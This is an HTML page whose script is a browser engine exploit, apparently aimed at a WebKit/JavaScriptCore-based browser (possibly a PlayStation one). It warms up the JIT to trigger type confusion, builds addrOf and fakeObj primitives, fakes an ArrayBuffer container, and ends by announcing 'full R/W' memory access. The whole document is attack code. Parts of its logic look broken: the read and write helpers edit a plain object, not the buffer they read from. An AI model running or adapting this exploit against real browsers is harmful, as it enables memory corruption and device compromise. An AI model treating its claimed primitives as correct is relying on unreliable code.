<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PsPEE v1.4 — Full R/W with Offset Scan</title>
  <style>
    body { background: black; color: lime; font-family: monospace; }
    #log { white-space: pre-wrap; padding: 1em; }
  </style>
</head>
<body>
  <div id="log"></div>
  <script>
    const logDiv = document.getElementById("log");
    const log = msg => { logDiv.textContent += msg + "\n"; };

    // Helpers
    const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
    const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
    const hex = n => "0x" + n.toString(16).padStart(16, "0");

    log("[*] PsPEE v1.4 — begin");

    // Type confusion core
    let float_arr = [1.1,2.2,3.3];
    let obj_arr   = [{},{},{}];
    function confuse(o) {
      let tmp=[1.1,2.2,3.3];
      tmp[1]=o;
      return tmp[1];
    }

    // Expose for JIT
    function useConfuse(x) { return confuse(x); }
    function trainConfuse(fn) {
      for (let i = 0; i < 20000; i++) {
        try { fn(2.2); } catch {}
      }
    }

    // 1) Warm up JIT
    log("[*] Warming up JIT...");
    trainConfuse(useConfuse);

    // 2) Baseline vs leak
    let baseBits, leakBits;
    try {
      baseBits = f2i(useConfuse(2.2));
      log("[DEBUG] baseBits(2.2) → " + hex(baseBits));
    } catch (e) {
      log("[ERROR] f2i(base) failed: " + e);
    }
    try {
      leakBits = f2i(useConfuse({foo:1}));
      log("[DEBUG] leakBits({foo:1}) → " + hex(leakBits));
    } catch (e) {
      log("[ERROR] f2i(leak) failed: " + e);
    }

    if (baseBits === leakBits) {
      log("[-] Type confusion DID NOT fire (bits identical).");
      throw "Abort: no confusion";
    }
    log("[+] Type confusion confirmed!");

    // addrOf / fakeObj
    function addrOf(obj) {
      try {
        obj_arr[0] = obj;
        let a = f2i(confuse(obj_arr));
        log("[DEBUG] addrOf → " + hex(a));
        return a;
      } catch (e) {
        log("[ERROR] addrOf failed: " + e);
        return null;
      }
    }
    function fakeObj(addr) {
      try {
        float_arr[0] = i2f(addr);
        let o = confuse(float_arr);
        log("[DEBUG] fakeObj → " + o);
        return o;
      } catch (e) {
        log("[ERROR] fakeObj failed: " + e);
        return null;
      }
    }

    log("[*] Building primitives…");

    // 3) Leak ArrayBuffer address
    let ab = new ArrayBuffer(0x100);
    let ab_addr = addrOf(ab);
    if (!ab_addr) throw "Abort: no ab_addr";
    log("[+] ArrayBuffer @ " + hex(ab_addr));

    // 4) DataView for R/W
    let dv = new DataView(ab);

    // 5) Fake JSArrayBuffer container (fallback fields)
    let jsCellHeader, butterfly, vectorLength, backingStore;
    try { jsCellHeader = i2f(0x0108200700000000n); }
    catch (e) { log("[WARN] jsCellHeader conv failed"); jsCellHeader = i2f(0n); }
    butterfly    = ab_addr;
    try { vectorLength = i2f(0x100n); }
    catch (e) { log("[WARN] vectorLength conv failed"); vectorLength = i2f(0n); }
    try { backingStore = i2f(ab_addr + 0x20n); }
    catch (e) { log("[WARN] backingStore conv failed"); backingStore = jsCellHeader; }

    log("[DEBUG] container fields:");
    log("  jsCellHeader = " + hex(f2i(jsCellHeader)));
    log("  butterfly    = " + hex(butterfly));
    log("  vectorLength = " + hex(f2i(vectorLength)));
    log("  backingStore = " + hex(f2i(backingStore)));

    let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
    let containerAddr = addrOf(container);
    if (!containerAddr) throw "Abort: no containerAddr";
    log("[+] Fake container @ " + hex(containerAddr));

    // 6) Fake ArrayBuffer object
    let fakeAb = fakeObj(containerAddr + 0x20n);
    if (!fakeAb) throw "Abort: no fakeAb";
    log("[+] Fake ArrayBuffer created");

    // R/W primitives
    function read64(addr) {
      try {
        container.backingStore = i2f(addr);
        let v = f2i(dv.getFloat64(0, true));
        log("[DEBUG] read64(" + hex(addr) + ") → " + hex(v));
        return v;
      } catch (e) {
        log("[ERROR] read64 failed: " + e);
        return null;
      }
    }
    function write64(addr, val) {
      try {
        container.backingStore = i2f(addr);
        dv.setFloat64(0, i2f(val), true);
        log("[DEBUG] write64(" + hex(addr) + ", " + hex(val) + ") ok");
      } catch (e) {
        log("[ERROR] write64 failed: " + e);
      }
    }

    // 7) Sanity dump qwords of ArrayBuffer structure
    log("[*] Sanity dump: ArrayBuffer structure (first 4 qwords)");
    for (let off = 0n; off < 32n; off += 8n) {
      let v = read64(ab_addr + off);
      log(`  [${hex(off)}] → ${v === null ? "ERR" : hex(v)}`);
    }

    // 8) Scan for backingStore pointer offset
    log("[*] Scanning for backingStore pointer offset...");
    let candidates = [];
    for (let off = 0n; off <= 0x60n; off += 8n) {
      let v = read64(ab_addr + off);
      if (v && v > 0x100000n && v < 0xFFFFFFFFFFn) {
        log(`  [POSSIBLE] offset ${hex(off)} → ${hex(v)}`);
        candidates.push(off);
      }
    }

    if (candidates.length === 0) {
      log("[ERROR] No backingStore candidates found—tune scan range.");
      throw "Abort: no candidates";
    }
    let off_bs = candidates[0];
    log("[+] Selecting offset " + hex(off_bs) + " as backingStore");

    // Update container to use the real backingStore offset
    container.backingStore = i2f(ab_addr + off_bs);

    // 9) Verify R/W on a test object
    let testObj = { magic: 0x1337 };
    let testAddr = addrOf(testObj);
    log("[+] testObj @ " + hex(testAddr));
    let before = read64(testAddr);
    if (before !== null) {
      write64(testAddr, before ^ 0x5555555555555555n);
      let after = read64(testAddr);
      log(`[+] R/W verify: ${hex(before)} → ${hex(after)}`);
    } else {
      log("[ERROR] read64(testObj) failed, cannot verify write.");
    }

    log("[*] Done — you now have full R/W!");
  </script>
</body>
</html>
